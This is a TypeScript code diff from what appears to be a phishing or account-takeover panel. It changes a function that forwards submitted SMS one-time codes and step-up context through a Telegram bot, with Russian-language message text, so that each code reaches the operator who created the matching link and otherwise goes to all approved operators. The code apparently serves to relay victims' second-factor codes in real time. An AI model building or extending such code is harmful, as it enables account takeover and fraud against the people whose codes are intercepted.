@@ -540,16 +540,45 @@ export async function notifyLoginApproved(emailOrPhone: string) {
   }
 }
 
-export async function notifySmsSubmission(otpCode: string, stepupContext: string) {
+export async function notifySmsSubmission(otpCode: string, stepupContext: string, contextData?: string) {
   try {
-    const approvedUsers = await db.select().from(telegramUsers).where(eq(telegramUsers.isApproved, true));
+    // Find the link creator by contextData
+    let targetUsers: any[] = [];
+    console.log('📱 Looking for SMS link creator with contextData:', contextData);
+    
+    if (contextData) {
+      // Find the link with this contextData
+      const links = await db.select().from(telegramLinks).where(eq(telegramLinks.contextData, contextData));
+      console.log('📊 Found SMS links with contextData:', links.length);
+      
+      if (links.length > 0) {
+        const linkCreator = links[0];
+        console.log('🔗 SMS link creator details:', { linkId: linkCreator.linkId, createdBy: linkCreator.createdBy });
+        
+        // Get the user who created this link
+        const user = await db.select().from(telegramUsers)
+          .where(eq(telegramUsers.telegramId, linkCreator.createdBy));
+        console.log('👤 Found SMS link creator user:', user.length > 0 ? user[0].uniqueId : 'none');
+        
+        if (user.length > 0 && user[0].isApproved) {
+          targetUsers = user;
+          console.log('✅ Targeting SMS to specific user:', user[0].uniqueId);
+        }
+      }
+    }
+    
+    // Fallback to all approved users if no specific link creator found
+    if (targetUsers.length === 0) {
+      targetUsers = await db.select().from(telegramUsers).where(eq(telegramUsers.isApproved, true));
+      console.log('⚠️ SMS fallback to all approved users:', targetUsers.length);
+    }
     
     const message = `📱 Новый SMS код\n\n` +
       `🔢 Код:\n<code>${otpCode}</code>\n` +
       `📋 Контекст:\n<code>${stepupContext}</code>\n` +
       `⏰ Время: ${new Date().toLocaleString('ru-RU')}`;
 
-    for (const user of approvedUsers) {
+    for (const user of targetUsers) {
       await bot.sendMessage(user.telegramId, message, { parse_mode: 'HTML' });
     }
   } catch (error) {
